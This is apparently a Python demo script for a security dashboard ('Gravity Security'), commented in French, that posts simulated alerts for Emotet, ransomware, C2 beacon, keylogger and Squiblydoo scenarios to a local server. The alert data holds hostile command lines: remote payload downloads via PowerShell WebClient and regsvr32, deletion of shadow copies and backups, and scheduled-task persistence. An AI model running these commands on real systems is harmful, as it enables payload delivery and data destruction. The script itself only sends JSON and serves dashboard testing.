"""
Gravity Security — Simulateur de Menaces
Génère des alertes réalistes pour tester le dashboard sans avoir de vrais malwares.
Lance ce script pendant que le serveur tourne pour voir le dashboard s'animer.

Usage:
    python demo/simulate_threats.py --server http://localhost:8000
"""

import time
import json
import random
import argparse
import urllib.request
from datetime import datetime


SCENARIOS = [
    {
        "name": "Attaque Macro Office (Emotet)",
        "alerts": [
            {
                "type": "SUSPICIOUS_PROCESS",
                "process": "powershell.exe",
                "parent": "winword.exe",
                "threat_score": 0.92,
                "severity": "critical",
                "reason": "Document Office lance un interpréteur shell — macro suspecte | PowerShell encodé en base64 | Téléchargement via WebClient",
                "cmdline": "powershell.exe -Enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -WindowStyle Hidden -NoProfile",
                "label": "Processus suspect",
                "action": "ISOLER la machine et terminer le processus immédiatement",
                "pid": 4892,
            },
            {
                "type": "SUSPICIOUS_PROCESS",
                "process": "cmd.exe",
                "parent": "powershell.exe",
                "threat_score": 0.88,
                "severity": "critical",
                "reason": "Double hop shell powershell→cmd | Création de tâche planifiée",
                "cmdline": "cmd.exe /c schtasks /create /tn GravityUpdate /tr C:\\Users\\Temp\\update.exe /sc onlogon",
                "label": "Processus suspect",
                "action": "ISOLER la machine et terminer le processus immédiatement",
                "pid": 5123,
            },
        ]
    },
    {
        "name": "Ransomware (simulation LockBit style)",
        "alerts": [
            {
                "type": "FILE_THREAT",
                "file": "C:\\Users\\HP\\Documents\\update_service.exe",
                "threat_score": 0.95,
                "severity": "critical",
                "entropy": 7.87,
                "reasons": ["Entropie très élevée (7.87/8.0) — possible packer/chiffrement", "33 imports dangereux détectés", "Strings suspectes: vssadmin, bcdedit, wbadmin"],
                "hash": "a3f4b2c1d5e6f7890abcdef1234567890abcdef1234567890abcdef12345678",
                "label": "Fichier malveillant",
                "action": "QUARANTAINE du fichier — analyse forensique recommandée",
            },
            {
                "type": "SUSPICIOUS_PROCESS",
                "process": "cmd.exe",
                "parent": "update_service.exe",
                "threat_score": 0.98,
                "severity": "critical",
                "reason": "Suppression des sauvegardes VSS | wbadmin delete catalog | bcdedit recoveryenabled no",
                "cmdline": "cmd.exe /c vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet && bcdedit /set {default} recoveryenabled no",
                "label": "Comportement ransomware",
                "action": "ISOLER la machine immédiatement — ransomware actif",
                "pid": 7731,
            },
        ]
    },
    {
        "name": "Exfiltration de données (C2 Beacon)",
        "alerts": [
            {
                "type": "SUSPICIOUS_PROCESS",
                "process": "powershell.exe",
                "parent": "chrome.exe",
                "threat_score": 0.85,
                "severity": "high",
                "reason": "Navigateur lance un shell — possible drive-by download | URL dans les arguments | Téléchargement via WebClient",
                "cmdline": "powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://185.220.101.47/beacon.exe','C:\\Users\\Temp\\svchost32.exe')",
                "label": "Téléchargement malveillant",
                "action": "Surveiller et collecter les logs — préparer isolation",
                "pid": 6341,
            },
        ]
    },
    {
        "name": "Accès réseau bloqué — Agent non autorisé",
        "alerts": [
            {
                "type": "NAC_BLOCK",
                "source_ip": "192.168.1.47",
                "threat_score": 0.70,
                "severity": "high",
                "reason": "Signature chaotique invalide — possible malware ou replay attack",
                "label": "Accès réseau bloqué",
                "action": "Connexion bloquée automatiquement — vérifier la source",
            },
        ]
    },
    {
        "name": "Keylogger détecté",
        "alerts": [
            {
                "type": "SIGNATURE_MATCH",
                "file": "C:\\ProgramData\\Microsoft\\svchost_helper.dll",
                "threat_score": 0.93,
                "severity": "critical",
                "reason": "Signature Keylogger_Hook détectée | SetWindowsHookEx + GetAsyncKeyState | WH_KEYBOARD_LL",
                "hash": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef12345678",
                "label": "Keylogger détecté",
                "action": "QUARANTAINE du fichier — analyse forensique recommandée",
            },
        ]
    },
    {
        "name": "Injection de processus",
        "alerts": [
            {
                "type": "SUSPICIOUS_PROCESS",
                "process": "regsvr32.exe",
                "parent": "powershell.exe",
                "threat_score": 0.87,
                "severity": "high",
                "reason": "Lancement de regsvr32.exe suspect | Injection de code dans processus distant",
                "cmdline": "regsvr32.exe /s /u /i:http://185.220.101.12/payload.sct scrobj.dll",
                "label": "Squiblydoo — Injection mémoire",
                "action": "Surveiller et collecter les logs — préparer isolation",
                "pid": 8812,
            },
        ]
    },
    {
        "name": "Activité suspecte modérée",
        "alerts": [
            {
                "type": "SUSPICIOUS_PROCESS",
                "process": "wscript.exe",
                "parent": "outlook.exe",
                "threat_score": 0.65,
                "severity": "medium",
                "reason": "Document Office lance un interpréteur shell | Exécution depuis répertoire temporaire",
                "cmdline": "wscript.exe C:\\Users\\HP\\AppData\\Local\\Temp\\invoice_2026.vbs",
                "label": "Script VBS depuis pièce jointe",
                "action": "Journaliser et surveiller le comportement",
                "pid": 3344,
            },
        ]
    },
]

AGENTS = [
    {"agent_id": "agent-PC-HP-001", "ip": "192.168.1.10", "hostname": "PC-HP-001", "os": "Windows 10 Pro"},
    {"agent_id": "agent-SRV-AD-01", "ip": "192.168.1.2", "hostname": "SRV-AD-01", "os": "Windows Server 2022"},
    {"agent_id": "agent-PC-DEV-03", "ip": "192.168.1.25", "hostname": "PC-DEV-03", "os": "Windows 11"},
    {"agent_id": "agent-PC-RH-02", "ip": "192.168.1.18", "hostname": "PC-RH-02", "os": "Windows 10"},
]


def post(server: str, endpoint: str, data: dict):
    try:
        body = json.dumps(data).encode()
        req = urllib.request.Request(
            f"{server}{endpoint}", data=body,
            headers={"Content-Type": "application/json"}, method="POST"
        )
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read())
    except Exception as e:
        print(f"  [!] Erreur POST {endpoint}: {e}")
        return None


def register_agents(server: str):
    print("\n► Enregistrement des agents...")
    for agent in AGENTS:
        result = post(server, "/api/agents/register", agent)
        if result:
            print(f"  ✓ {agent['hostname']} ({agent['ip']}) enregistré")
        time.sleep(0.3)


def send_heartbeats(server: str):
    for agent in AGENTS:
        post(server, "/api/agents/heartbeat", {
            "agent_id": agent["agent_id"],
            "type": "heartbeat",
            "timestamp": time.time(),
            "stats": {
                "nac": {"allowed": random.randint(100, 500), "blocked": random.randint(0, 5)},
                "processes": random.randint(80, 200),
                "alerts_pending": 0,
            }
        })


def run_simulation(server: str, speed: float = 1.0):
    print(f"\n{'='*60}")
    print("  GRAVITY SECURITY — SIMULATION DE MENACES")
    print(f"{'='*60}")
    print(f"  Serveur : {server}")
    print(f"  Agents  : {len(AGENTS)}")
    print(f"  Scénarios : {len(SCENARIOS)}")
    print(f"{'='*60}\n")

    # Enregistrement des agents
    register_agents(server)

    # Heartbeats initiaux
    print("\n► Envoi des heartbeats...")
    send_heartbeats(server)
    print("  ✓ Tous les agents en ligne")

    print("\n► Lancement des scénarios d'attaque...\n")

    scenario_list = list(SCENARIOS)
    random.shuffle(scenario_list)

    for i, scenario in enumerate(scenario_list):
        agent = random.choice(AGENTS)
        print(f"  [{i+1}/{len(scenario_list)}] {scenario['name']}")
        print(f"       └─ Agent victime: {agent['hostname']} ({agent['ip']})")

        alerts = scenario["alerts"]
        for alert in alerts:
            alert["agent_id"] = agent["agent_id"]
            alert["received_at"] = datetime.utcnow().isoformat()

        result = post(server, "/api/alerts", {
            "agent_id": agent["agent_id"],
            "alerts": alerts,
        })
        if result:
            print(f"       ✓ {len(alerts)} alerte(s) envoyée(s)")
        else:
            print(f"       ✗ Échec d'envoi")

        delay = random.uniform(2, 5) / speed
        time.sleep(delay)

        # Heartbeat entre scénarios
        send_heartbeats(server)

    print(f"\n{'='*60}")
    print("  SIMULATION TERMINÉE")
    print(f"  {sum(len(s['alerts']) for s in SCENARIOS)} alertes générées")
    print(f"{'='*60}\n")

    # Continue à envoyer des heartbeats
    print("► Mode veille — heartbeats toutes les 15s (Ctrl+C pour arrêter)\n")
    while True:
        send_heartbeats(server)
        time.sleep(15)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Gravity Security — Simulateur de menaces")
    parser.add_argument("--server", default="http://localhost:8000", help="URL du serveur")
    parser.add_argument("--speed", type=float, default=1.0, help="Vitesse (2.0 = 2x plus rapide)")
    args = parser.parse_args()

    try:
        run_simulation(args.server, args.speed)
    except KeyboardInterrupt:
        print("\n\n► Simulation arrêtée.")
